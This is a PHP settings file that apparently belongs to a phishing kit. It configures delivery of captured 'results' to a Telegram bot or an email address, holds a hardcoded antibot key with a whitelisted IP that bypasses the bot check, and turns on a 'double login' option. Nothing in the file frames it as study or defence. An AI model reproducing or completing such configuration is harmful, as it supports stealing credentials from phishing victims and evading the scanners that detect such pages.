<?php

//TELEGRAM SETTINGS

$telegram_results = false; // SET TO true OR false - BASED ON IF YOU WANT TO GET RESULTS IN TELEGRAM

$telegram_bot_api = 'TELEGRAM_BOT_API'; // YOUR TELEGRAM BOT'S API -  GET IT FROM https://t.me/botfather

$telegram_chat_id = 'TELEGRAM_CHAT_ID'; // TELEGRAM CHAT ID - GET IT FROM https://t.me/chatIDrobot


// ============================================================================== //



//EMAIL SETTINGS

$email_results = false; // SET TO true OR false - BASED ON IF YOU WANT TO GET RESULTS IN EMAIL

$email_address = 'email@address'; // THE EMAIL YOU WANT TO SEND RESULTS TO




//OTHER SETTINGS
$api = '0bdd6dec-6515-466e-bb20-bdeceb227384'; //antibot Key - ANTIBOT KEY dont change

$whitelistip = '::1'; // Whitelisted IP - BYPASS ANTIBOT

$double_login = true;
